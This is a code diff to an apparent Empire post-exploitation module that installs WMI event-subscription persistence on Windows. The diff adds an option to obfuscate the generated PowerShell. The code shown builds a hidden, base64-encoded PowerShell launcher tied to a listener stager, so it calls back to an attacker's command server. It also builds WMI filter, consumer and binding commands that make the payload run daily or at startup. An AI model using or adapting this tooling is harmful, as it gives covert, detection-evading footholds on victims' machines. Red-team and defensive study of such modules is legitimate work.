@@ -15,13 +15,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : True,
 
             'OpsecSafe' : False,
 
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'https://github.com/mattifestation/PowerSploit/blob/master/Persistence/Persistence.psm1'
             ]
@@ -55,7 +55,7 @@ class Module:
                 'Description'   :   'Name to use for the event subscription.',
                 'Required'      :   True,
                 'Value'         :   'Updater'
-            },                      
+            },
             'ExtFile' : {
                 'Description'   :   'Use an external file for the payload instead of a stager.',
                 'Required'      :   False,
@@ -94,10 +94,10 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
-        
+    def generate(self, obfuscate=False, obfuscationCommand=""):
+
         listenerName = self.options['Listener']['Value']
-        
+
         # trigger options
         dailyTime = self.options['DailyTime']['Value']
         atStartup = self.options['AtStartup']['Value']
@@ -121,11 +121,12 @@ class Module:
             script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='"+subName+"'\" | Remove-WmiObject;"
             script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '"+subName+"'} | Remove-WmiObject;"
             script += "'WMI persistence removed.'"
-            
+            if obfuscate:
+                script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
             return script
 
         if extFile != '':
-            # read in an external file as the payload and build a 
+            # read in an external file as the payload and build a
             #   base64 encoded version as encScript
             if os.path.exists(extFile):
                 f = open(extFile, 'r')
@@ -154,7 +155,7 @@ class Module:
             else:
                 # generate the PowerShell one-liner with all of the proper options set
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-                
+
                 encScript = launcher.split(" ")[-1]
                 statusMsg += "using listener " + listenerName
 
@@ -165,11 +166,11 @@ class Module:
 
         # built the command that will be triggered
         triggerCmd = "$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc " + encScript
-        
+
         if dailyTime != '':
-            
+
             parts = dailyTime.split(":")
-            
+
             if len(parts) < 2:
                 print helpers.color("[!] Please use HH:mm format for DailyTime")
                 return ""
@@ -195,5 +196,9 @@ class Module:
 
 
         script += "'WMI persistence established "+statusMsg+"'"
-        
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
